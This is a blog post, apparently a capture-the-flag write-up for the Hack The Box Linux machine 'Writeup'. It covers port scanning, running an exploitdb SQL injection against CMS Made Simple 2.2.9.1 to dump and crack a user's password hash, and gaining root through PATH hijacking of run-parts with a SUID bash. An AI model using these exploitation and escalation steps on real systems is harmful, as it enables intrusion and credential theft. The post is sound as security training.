---
permalink: /writeup
layout: post
author: jkr
title: Writeup
date: 2021-07-02
publish: True

description: "Writeup is an easy difficulty Linux box with a CMS DoS protection in place to prevent brute forcing with a SQL injection vulnerability, which is leveraged to gain user credentials.. The user is found to be in a non-default group, which gives write access to part
of the PATH. A path hijacking results in escalation of privileges to root.
"
---

# Skills Learned

- Path Hijacking
- Process learning

# Enumeration

## Nmap
* 80
* 22

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   516.48 ms 10.10.14.1
2   516.47 ms writeup.htb (10.10.10.138)
```

Port 80

![](/Writeups/Writeup/Pasted image 20210702151938.png)

There is a protection script to block the ip address so cannot brutefore directories. Let's look robots.txt

![](/Writeups/Writeup/Pasted image 20210702152135.png)


![](/Writeups/Writeup/Pasted image 20210702152151.png)

writeup date path looks like blog for machines. On further enumeration we can found what the site is made up of .

![](/Writeups/Writeup/Pasted image 20210702152511.png)

Version 2.2.9.1

![](/Writeups/Writeup/Pasted image 20210702153137.png)

```bash
--------------------------------------------- ---------------------------------
 Exploit Title                               |  Path
--------------------------------------------- ---------------------------------

CMS Made Simple < 2.2.10 - SQL Injection     | php/webapps/46635.py

--------------------------------------------- ---------------------------------
```

An exploit was found in exploitdb let's mirror the exploit.

``` searchsploit -m php/webapps/46635.py```

On running the exploit we got salt and password hash



```python

python2 46635.py -u http://10.10.10.138/writeup --crack -w rockyou.txt


[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9


```

Using the creds we can ssh into the box.

![](/Writeups/Writeup/Pasted image 20210702171443.png)

An interesting group called staff was found. Allows users to add local modifications to the system (/usr/local) without needing root privileges

![](/Writeups/Writeup/Pasted image 20210702171606.png)

In order to exploit this we need to find out some process that runs without full path. Using Pspy we can find out that when a user ssh into the box `run-parts` runs without full path lets's take advantage of that by creating a file `run-parts ` in `/usr/local/bin`

![](/Writeups/Writeup/Pasted image 20210702172142.png)

create a run-parts file in /usr/local/bin and give suid to bash

![](/Writeups/Writeup/Pasted image 20210702172708.png)

 when a new ssh session begins suid permission will be set to bash

![](/Writeups/Writeup/Pasted image 20210702172947.png)